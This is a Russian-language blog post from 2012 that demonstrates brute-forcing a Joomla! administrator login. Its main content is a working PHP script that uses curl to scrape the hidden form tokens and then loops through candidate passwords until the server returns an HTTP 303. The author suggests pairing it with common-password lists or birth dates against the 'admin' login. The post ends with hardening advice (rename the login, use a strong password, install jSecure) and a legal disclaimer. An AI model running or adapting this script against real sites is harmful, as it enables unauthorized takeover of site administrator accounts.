---
author: "Serhii Polishchuk"
title: "Подбор пароля к Joomla! админке"
date: 2012-04-09
tags: []
draft: false
---
<!--more-->
[![](http://kotoblog.pp.ua/wp-content/uploads/2012/04/pass-vk-300x300.jpg)](http://kotoblog.pp.ua/wp-content/uploads/2012/04/pass-vk.jpg) О небезопасности дефолтного логина в Joomla! я рассказывал в предыдущей заметке. Теперь же я постараюсь показать на конкретном примере почему это так. Также расскажу каким образом можно избежать такого рода уязвимости.
Во время работы над связкой Curl + SimpleHtmlDom для парсинга ВКонтакте, меня вдруг осенило. Вот пример рабочего кода перебора пароля к админке Joomla!:

```
require_once 'simple_html_dom.php';
$url = 'http://demo15.cloudaccess.net/administrator/index.php';
$pass = array('pass0','pass1','pass2','demo','pass3','pass4');
$ch = curl_init();
foreach ($pass as $password){
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt'); // вроде куда сохранять
  curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
  $out = curl_exec($ch);

  $html = new simple_html_dom();
  $html->load($out);
  $post = 'username=demo&;passwd='.$password.'&lang=';
    foreach($html->find('input[type=hidden]') as $element)
      $post.= '&'.$element->name.'='.$element->value;

  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt'); // вроде откуда брать
  curl_setopt($ch, CURLINFO_HEADER_OUT,true);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  curl_exec($ch);
  echo curl_error($ch);
  $info = curl_getinfo($ch);
  echo $password.'...'.$info['http_code'].'
';
  if ($info['http_code'] == 303)
    die('done!');
}

curl_close ($ch);
unset($ch);
```

Можно конечно рефакторить и оптимизировать до бесконечности, но пример робочий. Если мы захотим взломать админку простым перебором всех возможных вариантов паролей, например используя базы самых частых паролей или переберем возможные даты рождения, в сочитании с логином admin то есть вероятность того чтомы сможем подобрать пароль и никто нам в этом не помешает. Joomla! не имеет встроенной системы антифлуда, разве что хостинг, поэтому скорость перебора паролей будет зависить лишь от ширины канала и от скорости сервера.
Для лучшей безопасности меняем логин, придумываем сложный пароль и перестаем светить логинами во френтенде. Чтобы не давать повод подумать лихого используйте [jSecure](http://extensions.joomla.org/extensions/access-a-security/site-security/login-protection/12254) \- он поможет скрыть админку от чужых глаз.
Пример приведен для ознакомления, не нужно его использовать для взлома \- в большинстве случаев это незаконно.
P.S.: Спасибо [Мах](http://www.shtuchkishop.com/) за советы по усовершенствованию скрипта. :)
